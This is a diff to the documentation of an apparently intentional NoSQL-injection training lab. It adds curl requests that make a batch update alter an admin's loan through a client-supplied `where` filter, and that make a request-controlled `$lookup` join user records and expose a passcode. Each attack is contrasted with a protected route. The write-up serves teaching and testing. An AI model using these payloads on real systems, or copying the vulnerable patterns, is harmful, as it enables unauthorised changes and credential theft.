@@ -86,6 +86,21 @@ curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/batch -H 'Content-Type:
 # {"changed":1} — loan 101 was still out, so the attack changed 202
 ```
 
+The control never reads `where`, so that input cannot reach its filter. This one is a well-formed request for the admin loan, in the keys it does read:
+
+```bash
+curl -s -X POST http://127.0.0.1:3000/api/lab/reset
+# {"reset":true}
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/batch -H 'Content-Type: application/json' \
+  -d '{"items":[{"where":{"number":202},"number":202,"state":"in"}]}'
+# {"changed":1}
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/bundle -H 'Content-Type: application/json' \
+  -d '{"items":[{"where":{"number":202},"number":202,"state":"in"}]}'
+# {"changed":0} — the fixed borrower keeps loan 202 out of reach
+```
+
 **Observation that proves exploitation:** the attack reports `changed: 1` for a filter that cannot match the caller's own loan, and the read-back shows loan 101 untouched — the changed row is 202, the admin loan, which the ordinary input can never name.
 
 <a id="mongo-039-safe"></a>
@@ -96,12 +111,12 @@ curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/batch -H 'Content-Type:
 | `pages/api/workshop/loans/batch.js` | vulnerable | Each item's `where` object is the update filter as it arrives; the fixed `$set` does not constrain the filter. |
 | `pages/api/workshop/loans/bundle.js` | protected | The filter names the fixed borrower, the number is an element of `$in`, and the state is a fixed two-way choice. |
 
-The control is scoped to this flaw.
+The control is scoped to this flaw. The first input is inert because the control never reads `where`; the second reaches its filter, and the fixed borrower is what keeps it inert.
 
 <a id="mongo-039-tests"></a>
 ### Automated tests
 
-- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
+- `tests/unit/workshop-scenarios.test.mjs`: each input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
 - `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.
 
 ---
@@ -278,7 +293,19 @@ curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/linked -H 'Content-Type
 # status 400 — those keys are not read
 ```
 
-**Observation that proves exploitation:** the joined rows hold a passcode (`alice-lab-only`) in `extra`, a field no normal output of this API returns.
+The control reads `link` instead of those three keys, so that input stops at the 400. With `link` added, the same input reaches its own lookup — it joins `people` too:
+
+```bash
+curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/joined -H 'Content-Type: application/json' \
+  -d '{"from":"people","mine":"borrower","theirs":"login","link":"person"}'
+# rows carry complete people documents in "extra", passcode included
+
+curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/linked -H 'Content-Type: application/json' \
+  -d '{"from":"people","mine":"borrower","theirs":"login","link":"person"}'
+# {"rows":[{"number":101,"extra":[{"email":"alice@lab.test"}]}]}
+```
+
+**Observation that proves exploitation:** the joined rows hold a passcode (`alice-lab-only`) in `extra`, a field no normal output of this API returns. The control can be made to join the same collection, and still returns only the email.
 
 <a id="mongo-042-safe"></a>
 ### Vulnerable vs protected — and why
@@ -288,12 +315,12 @@ curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/linked -H 'Content-Type
 | `pages/api/workshop/loans/joined.js` | vulnerable | All three `$lookup` settings come from the request, and with no pipeline the joined documents arrive whole. |
 | `pages/api/workshop/loans/linked.js` | protected | The lookup document is one of two constants; the request only chooses between them. |
 
-The control is scoped to this flaw.
+The control is scoped to this flaw. The constants also fix the projection, which is why the `person` link joins `people` and returns no passcode.
 
 <a id="mongo-042-tests"></a>
 ### Automated tests
 
-- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
+- `tests/unit/workshop-scenarios.test.mjs`: each input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
 - `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.
 
 ---
